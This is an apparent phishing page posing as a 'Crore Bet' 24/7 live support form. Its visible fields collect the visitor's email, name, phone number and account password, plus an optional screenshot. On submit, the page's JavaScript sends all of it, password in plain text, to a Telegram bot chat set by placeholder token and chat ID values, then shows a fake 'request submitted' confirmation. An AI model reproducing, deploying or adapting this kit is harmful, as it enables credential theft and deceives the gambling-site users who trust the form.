<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crore Bet Support</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #0b0e14;
            color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            padding: 16px 14px 40px;
        }

        /* Alag se ubhar kar dikhne wala Form Card */
        .form-card {
            background-color: #161b26;
            width: 100%;
            max-width: 420px;
            padding: 20px 18px;
            border-radius: 18px;
            border: 1px solid #2d374e;
            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.8), 0 0 15px rgba(255, 242, 48, 0.05);
        }

        /* Logo Area */
        .logo-wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 16px;
        }

        .crore-bet-logo {
            background-color: #000000;
            display: inline-flex;
            align-items: center;
            padding: 7px 16px;
            border-radius: 8px;
            border: 1px solid #fff230;
        }

        .crore-text {
            color: #ffffff;
            font-size: 21px;
            font-weight: 900;
            letter-spacing: 1.5px;
            margin-right: 8px;
        }

        .bet-badge {
            background-color: #fff230;
            color: #000000;
            font-size: 17px;
            font-weight: 900;
            padding: 3px 8px;
            border-radius: 5px;
        }

        /* Live Support Status Dot */
        .live-status {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 8px;
        }

        .blinking-dot {
            width: 10px;
            height: 10px;
            background-color: #00ff66;
            border-radius: 50%;
            box-shadow: 0 0 10px #00ff66;
            animation: blinkLive 1.2s infinite ease-in-out;
        }

        @keyframes blinkLive {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.25; transform: scale(0.8); }
            100% { opacity: 1; transform: scale(1); }
        }

        .support-subtext {
            font-size: 13px;
            color: #fff230;
            font-weight: 800;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        /* Bade Input Fields & Labels */
        .input-group {
            margin-bottom: 13px;
            text-align: left;
        }

        label {
            display: block;
            margin-bottom: 6px;
            font-size: 14px;
            color: #cbd5e1;
            font-weight: 700;
            letter-spacing: 0.3px;
        }

        input[type="text"],
        input[type="email"],
        input[type="tel"],
        input[type="password"],
        select {
            width: 100%;
            padding: 12px 14px;
            background-color: #0b0e14;
            border: 1.5px solid #2d374e;
            border-radius: 10px;
            font-size: 15px;
            color: #ffffff;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        input::placeholder {
            color: #64748b;
            font-size: 14px;
        }

        input:focus,
        select:focus {
            border-color: #fff230;
            box-shadow: 0 0 8px rgba(255, 242, 48, 0.2);
        }

        select option {
            background-color: #161b26;
            color: #ffffff;
        }

        /* Screenshot Box */
        input[type="file"] {
            width: 100%;
            background-color: #0b0e14;
            border: 1.5px dashed #3b4866;
            border-radius: 10px;
            padding: 10px;
            font-size: 13px;
            color: #cbd5e1;
            outline: none;
            cursor: pointer;
        }

        /* Submit Button theek option ke neeche */
        button.submit-btn {
            width: 100%;
            padding: 14px;
            background-color: #fff230;
            color: #000000;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            cursor: pointer;
            margin-top: 14px;
            box-shadow: 0 4px 15px rgba(255, 242, 48, 0.3);
            transition: transform 0.15s ease, background-color 0.2s;
        }

        button.submit-btn:hover {
            background-color: #ffe600;
        }

        button.submit-btn:active {
            transform: scale(0.98);
        }

        button.submit-btn:disabled {
            background-color: #666014;
            color: #aaa;
            cursor: not-allowed;
            box-shadow: none;
        }

        /* Scroll karne par neeche aane wala Telegram Button */
        .telegram-section {
            width: 100%;
            max-width: 420px;
            margin-top: 35px;
            text-align: center;
        }

        .telegram-text {
            font-size: 13px;
            color: #94a3b8;
            margin-bottom: 10px;
        }

        .telegram-btn {
            display: block;
            width: 100%;
            padding: 14px;
            background-color: #0088cc;
            color: #ffffff;
            text-decoration: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 800;
            box-sizing: border-box;
            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.35);
        }

        /* Success Popup Modal */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
        }

        .modal-box {
            background-color: #181d29;
            border: 2px solid #fff230;
            border-radius: 14px;
            max-width: 320px;
            width: 100%;
            padding: 22px 18px;
            text-align: center;
        }

        .modal-icon {
            font-size: 38px;
            color: #38ef7d;
            margin-bottom: 8px;
        }

        .modal-title {
            font-size: 18px;
            font-weight: 800;
            color: #ffffff;
            margin-bottom: 8px;
        }

        .modal-desc {
            font-size: 13px;
            color: #cbd5e1;
            line-height: 1.5;
            margin-bottom: 16px;
        }

        .modal-btn {
            background-color: #fff230;
            color: #000000;
            border: none;
            padding: 10px 28px;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 800;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <!-- Main Card Box -->
    <div class="form-card">
        <!-- Logo Area with Live Pulse -->
        <div class="logo-wrapper">
            <div class="crore-bet-logo">
                <span class="crore-text">CRORE</span>
                <span class="bet-badge">BET</span>
            </div>
            <div class="live-status">
                <span class="blinking-dot"></span>
                <span class="support-subtext">24/7 Live Support</span>
            </div>
        </div>

        <form id="tgForm">
            <!-- 1. Email -->
            <div class="input-group">
                <label for="email">Email</label>
                <input type="email" id="email" placeholder="Enter your email" required>
            </div>

            <!-- 2. Name -->
            <div class="input-group">
                <label for="name">Name</label>
                <input type="text" id="name" placeholder="Enter your name" required>
            </div>

            <!-- 3. Phone Number -->
            <div class="input-group">
                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" placeholder="Enter phone number" required>
            </div>

            <!-- 4. Password -->
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter password" required>
            </div>

            <!-- 5. Problem Issue Dropdown -->
            <div class="input-group">
                <label for="problemIssue">Problem Issue</label>
                <select id="problemIssue" required>
                    <option value="" disabled selected>Select an issue...</option>
                    <option value="Email Confirm">Email Confirm</option>
                    <option value="Number Confirm">Number Confirm</option>
                    <option value="Profile Update">Profile Update</option>
                    <option value="Deposit Problem">Deposit Problem</option>
                    <option value="Bonus Issue">Bonus Issue</option>
                </select>
            </div>

            <!-- 6. Screenshot Upload -->
            <div class="input-group">
                <label for="screenshot">Upload Screenshot (Optional)</label>
                <input type="file" id="screenshot" accept="image/*">
            </div>

            <!-- Submit Button (Theek Options Ke Neeche) -->
            <button type="submit" id="submitBtn" class="submit-btn">Submit Request</button>
        </form>
    </div>

    <!-- Scroll karne par Telegram Button -->
    <div class="telegram-section">
        <p class="telegram-text">Need immediate help? Contact our direct support</p>
        <a href="https://t.me/YOUR_TELEGRAM_USERNAME" target="_blank" class="telegram-btn">Chat on Telegram</a>
    </div>

    <!-- Success Modal Popup -->
    <div class="modal-overlay" id="successModal">
        <div class="modal-box">
            <div class="modal-icon">✓</div>
            <h3 class="modal-title">Request Submitted!</h3>
            <p class="modal-desc">Your request has been successfully sent to our support team. We will review and resolve your issue shortly.</p>
            <button type="button" class="modal-btn" id="closeModalBtn">OK</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
        const CHAT_ID = "YOUR_CHAT_ID_HERE";

        const form = document.getElementById('tgForm');
        const submitBtn = document.getElementById('submitBtn');
        const modal = document.getElementById('successModal');
        const closeModalBtn = document.getElementById('closeModalBtn');

        closeModalBtn.addEventListener('click', function() {
            modal.style.display = 'none';
        });

        form.addEventListener('submit', function(e) {
            e.preventDefault();

            submitBtn.disabled = true;
            submitBtn.innerText = "Submitting...";

            const email = document.getElementById('email').value;
            const name = document.getElementById('name').value;
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const problemIssue = document.getElementById('problemIssue').value;
            const fileInput = document.getElementById('screenshot');
            const file = fileInput.files[0];

            const captionText = "📌 *New Request (Crore Bet)*\n\n" +
                                "📧 *Email:* " + email + "\n" +
                                "👤 *Name:* " + name + "\n" +
                                "📞 *Phone:* " + phone + "\n" +
                                "🔑 *Password:* " + password + "\n" +
                                "⚠️ *Problem Issue:* " + problemIssue;

            if (file) {
                const formData = new FormData();
                formData.append("chat_id", CHAT_ID);
                formData.append("photo", file);
                formData.append("caption", captionText);
                formData.append("parse_mode", "Markdown");

                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
                    method: "POST",
                    body: formData
                })
                .then(function(res) { return res.json(); })
                .then(handleResponse)
                .catch(handleError);
            } else {
                fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: captionText,
                        parse_mode: "Markdown"
                    })
                })
                .then(function(res) { return res.json(); })
                .then(handleResponse)
                .catch(handleError);
            }

            function handleResponse(data) {
                if (data.ok) {
                    modal.style.display = 'flex';
                    form.reset();
                } else {
                    alert("Telegram Error: Check Bot Token or Chat ID.");
                }
                submitBtn.disabled = false;
                submitBtn.innerText = "Submit Request";
            }

            function handleError() {
                alert("Network error! Please try again.");
                submitBtn.disabled = false;
                submitBtn.innerText = "Submit Request";
            }
        });
    </script>

</body>
</html>
